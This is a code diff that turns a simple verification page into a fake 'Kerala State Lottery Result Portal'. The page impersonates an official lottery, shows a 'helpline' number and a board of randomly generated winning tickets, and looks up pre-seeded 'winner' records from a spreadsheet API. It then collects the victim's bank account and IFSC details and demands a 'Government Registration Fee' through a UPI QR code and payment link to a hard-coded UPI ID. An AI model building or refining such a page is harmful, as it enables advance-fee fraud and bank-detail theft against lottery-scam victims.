@@ -3,123 +3,522 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Verification Portal</title>
+  <title>Kerala State Lottery Result Portal</title>
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700;800&display=swap" rel="stylesheet">
   <style>
-    * { box-sizing: border-box; font-family: sans-serif; margin: 0; padding: 0; }
-    body { background: #0b1329; color: #fff; padding: 15px; display: flex; justify-content: center; }
-    .box { width: 100%; max-width: 420px; background: #132247; border: 1px solid #ffcc00; border-radius: 12px; padding: 15px; }
-    .clock { background: #080f24; border: 1px solid #2e4374; border-radius: 6px; padding: 6px; text-align: center; color: #93c5fd; font-size: 13px; font-weight: bold; margin-bottom: 12px; }
-    input { width: 100%; padding: 10px; margin: 6px 0 10px; border-radius: 6px; border: 1px solid #2e4374; background: #080f24; color: #fff; }
-    .btn { width: 100%; padding: 11px; background: #ffcc00; color: #000; font-weight: bold; border: none; border-radius: 6px; cursor: pointer; }
-    .pay-btn { background: #22c55e; color: #fff; margin-top: 10px; }
-    #resultBox, #feeBox { display: none; margin-top: 15px; border-top: 1px dashed #445; padding-top: 12px; }
-    .card-info { background: #080f24; padding: 10px; border-radius: 6px; margin: 10px 0; font-size: 13px; }
-    .qr-wrap { background: #fff; padding: 8px; border-radius: 8px; display: inline-block; margin: 10px 0; }
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+      font-family: 'Poppins', sans-serif;
+    }
+    body {
+      background: radial-gradient(circle at top, #1a0b2e 0%, #080314 50%, #030108 100%);
+      background-image: 
+        radial-gradient(rgba(255, 215, 0, 0.08) 1px, transparent 1px),
+        radial-gradient(rgba(255, 215, 0, 0.05) 1px, transparent 1px);
+      background-size: 30px 30px, 60px 60px;
+      color: #ffffff;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      padding: 16px 12px 30px;
+    }
+    .top-banner {
+      width: 100%;
+      max-width: 440px;
+      background: linear-gradient(135deg, #d97706, #b45309);
+      border: 1px solid #fde047;
+      border-radius: 12px;
+      padding: 10px 14px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      box-shadow: 0 4px 15px rgba(217, 119, 6, 0.35);
+      margin-bottom: 14px;
+    }
+    .top-banner span {
+      font-size: 11.5px;
+      font-weight: 700;
+      color: #fff;
+      letter-spacing: 0.5px;
+    }
+    .call-btn {
+      background: #22c55e;
+      color: #fff;
+      padding: 6px 12px;
+      border-radius: 6px;
+      font-size: 12px;
+      font-weight: 700;
+      text-decoration: none;
+    }
+    .header {
+      text-align: center;
+      margin-bottom: 14px;
+    }
+    .badge {
+      display: inline-block;
+      background: rgba(234, 179, 8, 0.15);
+      border: 1px solid #eab308;
+      color: #facc15;
+      padding: 3px 12px;
+      border-radius: 15px;
+      font-size: 11px;
+      font-weight: 700;
+      letter-spacing: 0.8px;
+      margin-bottom: 5px;
+    }
+    .header h1 {
+      font-size: 19px;
+      font-weight: 800;
+      color: #fef08a;
+      text-shadow: 0 2px 10px rgba(250, 204, 21, 0.3);
+    }
+    .header p {
+      color: #cbd5e1;
+      font-size: 12px;
+      margin-top: 2px;
+    }
+    .clock-bar {
+      background: rgba(22, 10, 46, 0.9);
+      border: 1px solid #4a247a;
+      border-radius: 8px;
+      padding: 6px 12px;
+      font-size: 12px;
+      color: #facc15;
+      font-weight: 700;
+      margin-bottom: 12px;
+      display: flex;
+      align-items: center;
+      gap: 6px;
+    }
+    .pulse-dot {
+      width: 7px;
+      height: 7px;
+      background: #ef4444;
+      border-radius: 50%;
+      box-shadow: 0 0 6px #ef4444;
+    }
+    .card {
+      width: 100%;
+      max-width: 440px;
+      background: rgba(26, 12, 53, 0.92);
+      border: 1px solid #eab308;
+      border-radius: 16px;
+      padding: 20px 16px;
+      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.7);
+    }
+    label {
+      font-size: 12.5px;
+      font-weight: 600;
+      color: #fde68a;
+      display: block;
+      margin-bottom: 6px;
+    }
+    input {
+      width: 100%;
+      padding: 12px;
+      border-radius: 8px;
+      border: 1px solid #5b21b6;
+      background: #0f0521;
+      color: #fff;
+      font-size: 14px;
+      outline: none;
+      margin-bottom: 12px;
+    }
+    input:focus {
+      border-color: #facc15;
+    }
+    .btn {
+      width: 100%;
+      background: linear-gradient(135deg, #facc15, #ca8a04);
+      color: #1a0b2e;
+      font-weight: 800;
+      border: none;
+      padding: 13px;
+      border-radius: 8px;
+      font-size: 15px;
+      cursor: pointer;
+      box-shadow: 0 4px 12px rgba(202, 138, 4, 0.35);
+    }
+    #statusMsg {
+      text-align: center;
+      font-size: 13px;
+      font-weight: 600;
+      margin-top: 10px;
+    }
+    #resultBox {
+      display: none;
+      margin-top: 18px;
+      border-top: 1px dashed rgba(250, 204, 21, 0.4);
+      padding-top: 16px;
+    }
+    .win-badge {
+      text-align: center;
+      background: rgba(34, 197, 94, 0.15);
+      border: 1px solid #22c55e;
+      color: #4ade80;
+      padding: 6px;
+      border-radius: 6px;
+      font-size: 12.5px;
+      font-weight: 700;
+      margin-bottom: 12px;
+    }
+    .prize-box {
+      text-align: center;
+      background: linear-gradient(135deg, #2e1065, #1e0a45);
+      border: 1px solid #facc15;
+      border-radius: 10px;
+      padding: 12px;
+      margin-bottom: 12px;
+    }
+    .prize-box h2 {
+      font-size: 26px;
+      font-weight: 800;
+      color: #fef08a;
+    }
+    .prize-box p {
+      color: #facc15;
+      font-size: 12px;
+      font-weight: 700;
+      text-transform: uppercase;
+    }
+    .user-info {
+      background: #0d041c;
+      border-radius: 8px;
+      padding: 10px 12px;
+      margin-bottom: 14px;
+      border: 1px solid #3b1464;
+    }
+    .user-info div {
+      display: flex;
+      justify-content: space-between;
+      padding: 5px 0;
+      font-size: 12.5px;
+      border-bottom: 1px solid rgba(255,255,255,0.05);
+    }
+    .user-info div:last-child {
+      border-bottom: none;
+    }
+    .user-info span {
+      color: #94a3b8;
+    }
+    .user-info strong {
+      color: #fff;
+    }
+    .withdraw-wrap {
+      background: #120626;
+      border: 1px solid #4a1d82;
+      border-radius: 10px;
+      padding: 12px;
+      margin-top: 12px;
+    }
+    .withdraw-wrap h3 {
+      font-size: 13px;
+      color: #facc15;
+      margin-bottom: 10px;
+    }
+    .withdraw-wrap input {
+      margin-bottom: 8px;
+      padding: 10px;
+      font-size: 13px;
+    }
+    #feeSection {
+      display: none;
+      margin-top: 14px;
+      background: #0d041c;
+      border: 1px solid #facc15;
+      border-radius: 10px;
+      padding: 14px;
+      text-align: center;
+    }
+    .qr-holder {
+      background: #ffffff;
+      padding: 8px;
+      border-radius: 8px;
+      display: inline-block;
+      margin: 10px 0;
+    }
+    .qr-holder img {
+      width: 170px;
+      height: 170px;
+      display: block;
+    }
+    .pay-btn {
+      background: #22c55e;
+      color: #fff;
+      margin-top: 8px;
+    }
+    .kerala-img-wrap {
+      margin: 20px 0 10px;
+      border-radius: 10px;
+      overflow: hidden;
+      border: 1px solid #4a1d82;
+    }
+    .kerala-img-wrap img {
+      width: 100%;
+      height: auto;
+      display: block;
+    }
+    .winner-board {
+      margin-top: 20px;
+      background: #120626;
+      border: 1px solid #eab308;
+      border-radius: 12px;
+      padding: 14px;
+    }
+    .winner-board-title {
+      font-size: 13px;
+      font-weight: 800;
+      color: #fde047;
+      display: flex;
+      justify-content: space-between;
+      border-bottom: 1px solid #3b1464;
+      padding-bottom: 8px;
+      margin-bottom: 10px;
+    }
+    .board-row {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding: 7px 0;
+      font-size: 12px;
+      border-bottom: 1px dashed rgba(255,255,255,0.07);
+    }
+    .board-row:last-child {
+      border-bottom: none;
+    }
+    .rank-pill {
+      background: #3b1464;
+      color: #facc15;
+      padding: 2px 7px;
+      border-radius: 4px;
+      font-weight: 700;
+      font-size: 11px;
+      margin-right: 6px;
+    }
+    .tkt-num {
+      font-family: monospace;
+      font-weight: 700;
+      color: #f8fafc;
+    }
+    .prz-amt {
+      color: #4ade80;
+      font-weight: 800;
+      text-align: right;
+    }
+    .prz-person {
+      color: #94a3b8;
+      font-size: 10px;
+      display: block;
+      text-align: right;
+    }
   </style>
 </head>
 <body>
 
-<div class="box">
-  <!-- 1. Real Time Clock -->
-  <div class="clock" id="liveClock">Loading Date & Time...</div>
+  <div class="top-banner">
+    <span>📞 KERALA LOTTERY HELPLINE: +91 8709171965</span>
+    <a href="tel:8709171965" class="call-btn">Call Now</a>
+  </div>
 
-  <!-- 2. Search -->
-  <label style="font-size: 13px;">Ticket ya Mobile Number:</label>
-  <input type="text" id="searchInput" placeholder="e.g. KL-584920 / 9876543210">
-  <button class="btn" onclick="checkTicket()">Check Status</button>
-  <div id="status" style="text-align: center; font-size: 13px; margin-top: 8px;"></div>
+  <div class="header">
+    <div class="badge">OFFICIAL LOTTERY VERIFICATION</div>
+    <h1>Kerala State Lottery Results</h1>
+    <p>Apna Ticket Number ya Mobile Number daal kar check karein</p>
+  </div>
 
-  <!-- 3. Result Section -->
-  <div id="resultBox">
-    <div style="color: #4ade80; text-align: center; font-weight: bold;">🎉 WINNER VERIFIED</div>
-    <div class="card-info">
-      <p>Name: <b id="resName">-</b></p>
-      <p>Prize: <b id="resPrize" style="color:#ffcc00">-</b></p>
-      <p>Amount: <b id="resAmt" style="color:#4ade80">-</b></p>
+  <div class="card">
+    <!-- Live Real-Time Clock -->
+    <div class="clock-bar">
+      <span class="pulse-dot"></span>
+      <span id="liveTimeBadge">Loading Date & Time...</span>
     </div>
 
-    <!-- 4. Withdraw Form -->
-    <h4 style="color: #ffcc00; margin-bottom: 5px;">Bank Details:</h4>
-    <input type="text" id="wName" placeholder="Account Holder Name">
-    <input type="text" id="wBank" placeholder="Bank Name">
-    <input type="number" id="wAcc" placeholder="Account Number">
-    <input type="text" id="wIfsc" placeholder="IFSC Code" style="text-transform: uppercase;">
-    <button class="btn" onclick="submitWithdraw()">Submit & Proceed to Fee</button>
+    <label>Ticket Number / Mobile Number:</label>
+    <input type="text" id="searchInput" placeholder="e.g. KL-254635 ya 9876543210">
+    <button class="btn" onclick="searchTicket()">Check Result</button>
+    <div id="statusMsg"></div>
 
-    <!-- 5. Government Fee & Dynamic QR -->
-    <div id="feeBox" style="text-align: center;">
-      <p style="font-size: 14px;">Government Fee: <b id="resFee" style="color: #ffcc00;">₹0</b></p>
-      <div class="qr-wrap">
-        <img id="qrImg" src="" width="160" height="160" alt="QR Code">
+    <!-- Result Display Section -->
+    <div id="resultBox">
+      <div class="win-badge">🎉 TICKET WINNER VERIFIED</div>
+      <div class="prize-box">
+        <p id="resPrizeName">1st Prize</p>
+        <h2 id="resPrizeAmount">₹25,00,00,000</h2>
       </div>
-      <p style="font-size: 12px; color: #aaa;" id="upiText">UPI ID: -</p>
-      <button class="btn pay-btn" onclick="payUpi()">Pay via UPI App Directly</button>
+
+      <div class="user-info">
+        <div><span>Winner Name:</span><strong id="resName">-</strong></div>
+        <div><span>Ticket Number:</span><strong id="resTicket">-</strong></div>
+        <div><span>Registered Mobile:</span><strong id="resMobile">-</strong></div>
+      </div>
+
+      <!-- Withdraw Section -->
+      <div class="withdraw-wrap">
+        <h3>🏦 Withdraw Prize to Bank Account</h3>
+        <input type="text" id="wName" placeholder="Account Holder Name">
+        <input type="text" id="wBank" placeholder="Bank Name">
+        <input type="number" id="wAcc" placeholder="Account Number">
+        <input type="text" id="wIfsc" placeholder="IFSC Code" style="text-transform: uppercase;">
+        <button class="btn" onclick="submitBankDetails()">Submit & Proceed to Fee</button>
+
+        <!-- Government Fee & UPI QR -->
+        <div id="feeSection">
+          <p style="font-size: 13px; color: #fde68a;">Government Registration Fee:</p>
+          <h2 id="resFee" style="color: #4ade80; margin: 4px 0 10px;">₹3250</h2>
+          
+          <div class="qr-holder">
+            <img id="qrImg" src="" alt="UPI QR">
+          </div>
+          <p id="upiDisplay" style="font-size: 12px; color: #cbd5e1; margin-bottom: 8px;">UPI: -</p>
+          <button class="btn pay-btn" onclick="payWithUpi()">Pay via UPI App Directly</button>
+        </div>
+      </div>
+    </div>
+
+    <!-- Kerala Lottery Banner Graphic -->
+    <div class="kerala-img-wrap">
+      <img src="https://images.unsplash.com/photo-1518609878373-06d740f60d8b?auto=format&fit=crop&w=700&q=80" alt="Kerala Lottery Draw Celebration">
+    </div>
+
+    <!-- Random Winners Board (1st to 10th Prize) -->
+    <div class="winner-board">
+      <div class="winner-board-title">
+        <span>🏆 TODAY'S WINNING TICKETS</span>
+        <span style="color: #4ade80;">● DRAW LIVE</span>
+      </div>
+      <div id="winnerListRows"></div>
     </div>
   </div>
-</div>
 
-<script>
-  const API = "https://sheetdb.io/api/v1/vpi9mg3o0yk7q";
-  let fee = "3250", upi = "keralaLottery@paytm";
+  <script>
+    const SHEET_API = "https://sheetdb.io/api/v1/vpi9mg3o0yk7q";
+    let feeAmount = "3250";
+    let upiIdValue = "keralaLottery@paytm";
 
-  // Clock
-  setInterval(() => {
-    const d = new Date();
-    document.getElementById("liveClock").textContent = d.toLocaleDateString('en-GB') + " | " + d.toLocaleTimeString('en-US');
-  }, 1000);
+    // 1. Live Real-Time Date & Time
+    setInterval(() => {
+      const d = new Date();
+      const dateStr = d.toLocaleDateString('en-GB', { day: '2-digit', month: 'short', year: 'numeric' });
+      const timeStr = d.toLocaleTimeString('en-US', { hour: '2-digit', minute: '2-digit', second: '2-digit', hour12: true });
+      document.getElementById("liveTimeBadge").textContent = `${dateStr} | ${timeStr}`;
+    }, 1000);
 
-  // Search
-  async function checkTicket() {
-    const q = document.getElementById("searchInput").value.trim().toLowerCase();
-    const st = document.getElementById("status");
-    if (!q) { st.textContent = "Kripya number dalein."; st.style.color = "#f87171"; return; }
-    st.textContent = "Checking..."; st.style.color = "#ffcc00";
+    // 2. Kerala Prize Table (1st to 10th Prize)
+    const prizeList = [
+      { rank: "1st Prize", prize: "₹25 Crore", person: "(1 Person)" },
+      { rank: "2nd Prize", prize: "₹10 Crore", person: "(1 Person)" },
+      { rank: "3rd Prize", prize: "₹75 Lakh", person: "(1 Person)" },
+      { rank: "4th Prize", prize: "₹25 Lakh", person: "(12 Person)" },
+      { rank: "5th Prize", prize: "₹12 Lakh", person: "(16 Person)" },
+      { rank: "6th Prize", prize: "₹1 Lakh", person: "(36 Person)" },
+      { rank: "7th Prize", prize: "₹75,000", person: "(99 Person)" },
+      { rank: "8th Prize", prize: "₹25,000", person: "(120 Person)" },
+      { rank: "9th Prize", prize: "₹10,000", person: "(179 Person)" },
+      { rank: "10th Prize", prize: "₹2,500", person: "(200 Person)" }
+    ];
 
-    try {
-      const res = await fetch(API);
-      const data = await res.json();
-      const item = data.find(r => (r.ticket && r.ticket.trim().toLowerCase() === q) || (r.mobile && r.mobile.trim() === q));
+    function renderWinnersBoard() {
+      const container = document.getElementById("winnerListRows");
+      let html = "";
+      prizeList.forEach((item, index) => {
+        const randNum = Math.floor(100000 + Math.random() * 900000);
+        const ticketFormat = `KL ${randNum}`;
+        html += `
+          <div class="board-row">
+            <div>
+              <span class="rank-pill">${item.rank}</span>
+              <span class="tkt-num">${ticketFormat}</span>
+            </div>
+            <div>
+              <span class="prz-amt">${item.prize}</span>
+              <span class="prz-person">${item.person}</span>
+            </div>
+          </div>
+        `;
+      });
+      container.innerHTML = html;
+    }
+    renderWinnersBoard();
 
-      if (item) {
-        st.textContent = "";
-        document.getElementById("resName").textContent = item.name || "-";
-        document.getElementById("resPrize").textContent = item.prize || "-";
-        document.getElementById("resAmt").textContent = item.amount || "-";
-        document.getElementById("wName").value = item.name || "";
-        fee = item.fee || "3250";
-        upi = item.upiId || "keralaLottery@paytm";
-        document.getElementById("resFee").textContent = "₹" + fee;
-        document.getElementById("resultBox").style.display = "block";
-      } else {
-        st.textContent = "Data nahi mila. Dobara check karein."; st.style.color = "#f87171";
+    // 3. Search Result & Show Details
+    async function searchTicket() {
+      const query = document.getElementById("searchInput").value.trim().toLowerCase();
+      const status = document.getElementById("statusMsg");
+      const resultBox = document.getElementById("resultBox");
+      const feeSec = document.getElementById("feeSection");
+
+      if (!query) {
+        status.style.color = "#f87171";
+        status.textContent = "Kripya Ticket Number ya Mobile Number dalein.";
+        return;
       }
-    } catch (e) {
-      st.textContent = "Server error. Dobara koshish karein."; st.style.color = "#f87171";
+
+      status.style.color = "#facc15";
+      status.textContent = "Searching records in server...";
+      resultBox.style.display = "none";
+      feeSec.style.display = "none";
+
+      try {
+        const res = await fetch(SHEET_API);
+        const data = await res.json();
+        const record = data.find(r => 
+          (r.ticket && r.ticket.trim().toLowerCase() === query) || 
+          (r.mobile && r.mobile.trim() === query)
+        );
+
+        if (record) {
+          status.textContent = "";
+          document.getElementById("resPrizeName").textContent = record.prize || "Prize Winner";
+          document.getElementById("resPrizeAmount").textContent = record.amount || "₹0";
+          document.getElementById("resName").textContent = record.name || "-";
+          document.getElementById("resTicket").textContent = record.ticket || "-";
+          document.getElementById("resMobile").textContent = record.mobile ? record.mobile.replace(/.(?=.{4})/g, '*') : "-";
+          document.getElementById("wName").value = record.name || "";
+
+          feeAmount = record.fee || "3250";
+          upiIdValue = record.upiId || "keralaLottery@paytm";
+          document.getElementById("resFee").textContent = "₹" + feeAmount;
+
+          resultBox.style.display = "block";
+        } else {
+          status.style.color = "#f87171";
+          status.textContent = "Koi record nahi mila. Ticket/Mobile no dobara check karein.";
+        }
+      } catch (err) {
+        status.style.color = "#f87171";
+        status.textContent = "Server error. Dobara koshish karein.";
+      }
     }
-  }
 
-  // Withdraw & QR
-  function submitWithdraw() {
-    const name = document.getElementById("wName").value.trim();
-    const bank = document.getElementById("wBank").value.trim();
-    const acc = document.getElementById("wAcc").value.trim();
-    const ifsc = document.getElementById("wIfsc").value.trim();
+    // 4. Submit Bank Details & Open Fee QR
+    function submitBankDetails() {
+      const name = document.getElementById("wName").value.trim();
+      const bank = document.getElementById("wBank").value.trim();
+      const acc = document.getElementById("wAcc").value.trim();
+      const ifsc = document.getElementById("wIfsc").value.trim();
 
-    if (!name || !bank || !acc || !ifsc) {
-      alert("Kripya saari bank details bharein!");
-      return;
+      if (!name || !bank || !acc || !ifsc) {
+        alert("Kripya poori bank details bharein!");
+        return;
+      }
+
+      const upiUrl = `upi://pay?pa=${encodeURIComponent(upiIdValue)}&pn=KeralaLotteryGov&am=${feeAmount}&cu=INR&tn=GovRegistrationFee`;
+      document.getElementById("qrImg").src = `https://quickchart.io/qr?text=${encodeURIComponent(upiUrl)}&size=170`;
+      document.getElementById("upiDisplay").textContent = `UPI ID: ${upiIdValue}`;
+
+      const feeSec = document.getElementById("feeSection");
+      feeSec.style.display = "block";
+      feeSec.scrollIntoView({ behavior: 'smooth' });
     }
 
-    const upiLink = `upi://pay?pa=${encodeURIComponent(upi)}&pn=Verification&am=${fee}&cu=INR&tn=Fee`;
-    document.getElementById("qrImg").src = `https://quickchart.io/qr?text=${encodeURIComponent(upiLink)}&size=160`;
-    document.getElementById("upiText").textContent = `UPI ID: ${upi}`;
-    document.getElementById("feeBox").style.display = "block";
-  }
-
-  function payUpi() {
-    window.location.href = `upi://pay?pa=${encodeURIComponent(upi)}&pn=Verification&am=${fee}&cu=INR&tn=Fee`;
-  }
-</script>
-
+    // 5. Direct UPI App Trigger
+    function payWithUpi() {
+      const upiUrl = `upi://pay?pa=${encodeURIComponent(upiIdValue)}&pn=KeralaLotteryGov&am=${feeAmount}&cu=INR&tn=GovRegistrationFee`;
+      window.location.href = upiUrl;
+    }
+  </script>
 </body>
 </html>
